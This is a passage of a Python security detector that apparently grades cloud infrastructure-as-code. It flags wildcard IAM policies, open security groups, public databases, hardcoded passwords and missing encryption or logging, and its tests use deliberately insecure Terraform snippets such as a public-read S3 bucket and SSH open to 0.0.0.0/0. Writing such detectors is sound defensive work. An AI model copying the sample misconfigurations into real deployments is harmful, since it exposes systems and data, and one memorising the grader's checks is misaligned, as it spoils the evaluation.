                    self.score = max(0, self.score - 1)

        # Pattern 3: Overly permissive IAM policies
        if re.search(r'Type:\s*AWS::IAM::(?:Policy|Role)', code):
            has_wildcard_actions = re.search(r'Action:\s*["\']?\*|Action:\s*\n\s+-\s*["\']?\*', code)
            has_wildcard_resources = re.search(r'Resource:\s*["\']?\*|Resource:\s*\n\s+-\s*["\']?\*', code)

            if has_wildcard_actions or has_wildcard_resources:
                locations = find_pattern_locations(code, r'Type:\s*AWS::IAM')
                if locations:
                    self.vulnerabilities.append({
                        "type": "OVERLY_PERMISSIVE_IAM",
                        "severity": "HIGH",
                        "description": "IAM policy uses wildcard (*) permissions - principle of least privilege violated",
                        "recommendation": "Specify exact actions and resources needed instead of wildcards",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 4: Unrestricted security group (0.0.0.0/0)
        if re.search(r'Type:\s*AWS::EC2::SecurityGroup', code):
            has_open_ingress = re.search(r'CidrIp:\s*["\']?0\.0\.0\.0/0', code)

            if has_open_ingress:
                locations = find_pattern_locations(code, r'CidrIp:\s*["\']?0\.0\.0\.0/0')
                if locations:
                    self.vulnerabilities.append({
                        "type": "UNRESTRICTED_SECURITY_GROUP",
                        "severity": "CRITICAL",
                        "description": "Security group allows unrestricted access from 0.0.0.0/0",
                        "recommendation": "Restrict ingress to specific IP ranges or security groups",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 5: Public RDS database
        if re.search(r'Type:\s*AWS::RDS::DBInstance', code):
            has_public_access = re.search(r'PubliclyAccessible:\s*true', code)

            if has_public_access:
                locations = find_pattern_locations(code, r'PubliclyAccessible:\s*true')
                if locations:
                    self.vulnerabilities.append({
                        "type": "PUBLIC_DATABASE",
                        "severity": "CRITICAL",
                        "description": "RDS database is publicly accessible from internet",
                        "recommendation": "Set PubliclyAccessible: false and use VPN/bastion for access",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = 0

        # Pattern 6: Hardcoded credentials in Parameters or resource properties
        has_hardcoded_secrets = re.search(r'(?:MasterUserPassword|Password):\s*["\'](?!Ref|GetAtt)[^"\'$]{8,}', code)
        if has_hardcoded_secrets:
            locations = find_pattern_locations(code, r'(?:MasterUserPassword|Password):\s*["\']')
            if locations:
                self.vulnerabilities.append({
                    "type": "HARDCODED_CREDENTIALS",
                    "severity": "CRITICAL",
                    "description": "Hardcoded credentials in CloudFormation template",
                    "recommendation": "Use AWS Secrets Manager: !Sub '{{resolve:secretsmanager:MySecret}}'",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = 0

        # Pattern 7: Missing EBS encryption
        if re.search(r'Type:\s*AWS::EC2::Instance', code):
            has_encrypted_volumes = re.search(r'Encrypted:\s*true', code)
            if not has_encrypted_volumes:
                locations = find_pattern_locations(code, r'Type:\s*AWS::EC2::Instance')
                if locations and self.score > 0:
                    self.vulnerabilities.append({
                        "type": "MISSING_ENCRYPTION_EBS",
                        "severity": "HIGH",
                        "description": "EC2 instance volumes lack encryption",
                        "recommendation": "Enable EBS encryption with Encrypted: true in BlockDeviceMappings",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)

        # Pattern 8: Missing CloudWatch alarms/logging
        has_cloudtrail = re.search(r'Type:\s*AWS::CloudTrail::Trail', code)
        has_logging = re.search(r'Type:\s*AWS::Logs::LogGroup', code)
        has_vpc = re.search(r'Type:\s*AWS::EC2::VPC', code)

        if has_vpc and not (has_cloudtrail or has_logging):
            locations = find_pattern_locations(code, r'Type:\s*AWS::EC2::VPC')
            if locations and self.score > 0:
                self.vulnerabilities.append({
                    "type": "MISSING_LOGGING",
                    "severity": "MEDIUM",
                    "description": "Infrastructure lacks CloudTrail or VPC Flow Logs",
                    "recommendation": "Add AWS::CloudTrail::Trail and enable VPC Flow Logs",
                    "line_number": locations[0]['line_number'],
                    "code_snippet": locations[0]['line_content']
                })
                self.score = max(0, self.score - 1)

        # Pattern 9: Disabled S3 versioning
        if re.search(r'Type:\s*AWS::S3::Bucket', code):
            has_versioning = re.search(r'VersioningConfiguration:\s*\n\s+Status:\s*Enabled', code)
            if not has_versioning:
                locations = find_pattern_locations(code, r'Type:\s*AWS::S3::Bucket')
                if locations and self.score > 0:
                    self.vulnerabilities.append({
                        "type": "VERSIONING_DISABLED",
                        "severity": "MEDIUM",
                        "description": "S3 bucket versioning disabled - data loss risk",
                        "recommendation": "Enable versioning: VersioningConfiguration.Status: Enabled",
                        "line_number": locations[0]['line_number'],
                        "code_snippet": locations[0]['line_content']
                    })
                    self.score = max(0, self.score - 1)
        # AUTO-FAIL: Any CRITICAL vulnerability forces score to 0
        if any(v.get('severity') == 'CRITICAL' for v in self.vulnerabilities):
            self.score = 0

        return {
            "score": self.score,
            "vulnerabilities": self.vulnerabilities,
            "max_score": 2
        }


def test_terraform_public_bucket():
    """Test detection of public S3 bucket."""
    vulnerable_code = '''
resource "aws_s3_bucket" "uploads" {
  bucket = "my-uploads"
  acl    = "public-read"
}
'''
    detector = CloudIaCDetector()
    result = detector.analyze(vulnerable_code, "terraform")
    assert result["score"] == 0, "Should detect public S3 bucket"
    assert any('PUBLIC_S3_BUCKET' in v['type'] for v in result['vulnerabilities'])


def test_terraform_unrestricted_sg():
    """Test detection of unrestricted security group."""
    vulnerable_code = '''
resource "aws_security_group" "web" {
  name = "web-sg"

  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
'''
    detector = CloudIaCDetector()
    result = detector.analyze(vulnerable_code, "terraform")
    assert result["score"] == 0, "Should detect unrestricted security group"
    assert any('UNRESTRICTED' in v['type'] for v in result['vulnerabilities'])


if __name__ == "__main__":
    test_terraform_public_bucket()
    test_terraform_unrestricted_sg()
    print("All Cloud IaC detection tests passed!")
